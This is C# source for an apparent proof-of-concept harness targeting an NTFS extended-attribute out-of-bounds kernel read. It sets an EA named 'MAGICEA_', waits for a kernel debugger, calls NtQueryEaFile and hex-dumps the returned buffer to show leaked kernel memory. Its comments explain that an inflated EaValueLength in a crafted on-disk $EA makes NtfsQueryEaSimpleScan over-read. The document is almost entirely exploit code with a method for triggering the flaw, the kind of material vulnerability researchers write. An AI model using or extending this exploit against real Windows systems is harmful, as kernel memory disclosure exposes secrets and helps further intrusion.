using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

// PoC harness for the NTFS $EA out-of-bounds read (CVE-2026-503xx family).
//
// It sets one extended attribute with a DISTINCTIVE name ("MAGICEA_") and a
// small 16-byte value, then queries EAs back via NtQueryEaFile, which drives
// Ntfs!NtfsQueryEaSimpleScan.  On its own this is a perfectly legal EA
// round-trip.  The out-of-bounds read is demonstrated by the kernel debugger:
// at the memmove inside NtfsQueryEaSimpleScan, the copy length is taken from
// the entry's EaValueLength field with no upper-bound check against the EA
// stream size.  Inflating that length (exactly what a crafted on-disk $EA
// would contain) makes the copy over-read adjacent kernel memory straight into
// this process's output buffer.  We dump that buffer to prove the disclosure.
class Poc
{
    [StructLayout(LayoutKind.Sequential)]
    struct IO_STATUS_BLOCK { public IntPtr Status; public IntPtr Information; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa,
                                     uint disp, uint flags, IntPtr tmpl);

    [DllImport("ntdll.dll")]
    static extern int NtSetEaFile(IntPtr h, ref IO_STATUS_BLOCK io, byte[] buf, int len);

    [DllImport("ntdll.dll")]
    static extern int NtQueryEaFile(IntPtr h, ref IO_STATUS_BLOCK io, byte[] buf, int len,
                                    bool single, IntPtr eaList, int eaListLen,
                                    IntPtr eaIndex, bool restart);

    const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000;
    const uint FILE_SHARE_ALL = 0x7;
    const uint CREATE_ALWAYS = 2;

    static void Main(string[] args)
    {
        int sleepMs = (args.Length > 0 ? int.Parse(args[0]) : 4) * 1000;
        string path = @"C:\poc\eatest.dat";
        string outp = @"C:\poc\out.txt";
        var log = new StringBuilder();

        IntPtr h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_ALL,
                               IntPtr.Zero, CREATE_ALWAYS, 0x80, IntPtr.Zero);
        if (h.ToInt64() == -1)
        {
            File.WriteAllText(outp, "CreateFile failed " + Marshal.GetLastWin32Error());
            return;
        }

        string name = "MAGICEA_";
        byte nl = (byte)name.Length;
        ushort vl = 16;
        int entry = ((4 + 1 + 1 + 2 + (nl + 1) + vl) + 3) & ~3;
        byte[] ea = new byte[entry];
        ea[5] = nl;
        ea[6] = (byte)(vl & 0xff);
        ea[7] = (byte)(vl >> 8);
        for (int i = 0; i < nl; i++) ea[8 + i] = (byte)name[i];
        for (int i = 0; i < vl; i++) ea[8 + nl + 1 + i] = 0x41;

        IO_STATUS_BLOCK io1 = new IO_STATUS_BLOCK();
        int st = NtSetEaFile(h, ref io1, ea, ea.Length);
        log.AppendLine("NtSetEaFile   = 0x" + st.ToString("X8"));

        System.Threading.Thread.Sleep(sleepMs); // window for the debugger to arm

        byte[] outbuf = new byte[65536];
        IO_STATUS_BLOCK io2 = new IO_STATUS_BLOCK();
        int q = NtQueryEaFile(h, ref io2, outbuf, outbuf.Length, false,
                              IntPtr.Zero, 0, IntPtr.Zero, true);
        long info = io2.Information.ToInt64();

        log.AppendLine("NtQueryEaFile = 0x" + q.ToString("X8"));
        log.AppendLine("bytesReturned = " + info + " (0x" + info.ToString("X") + ")");
        log.AppendLine("valueLenSet   = " + vl + "   (entry we wrote = " + entry + " bytes)");
        int dump = (int)Math.Min(info > 0 ? info : 64, 1024);
        for (int i = 0; i < dump; i += 16)
        {
            log.Append(i.ToString("X4") + ": ");
            for (int j = 0; j < 16 && i + j < dump; j++)
                log.Append(outbuf[i + j].ToString("X2") + " ");
            log.AppendLine();
        }
        File.WriteAllText(outp, log.ToString());
    }
}
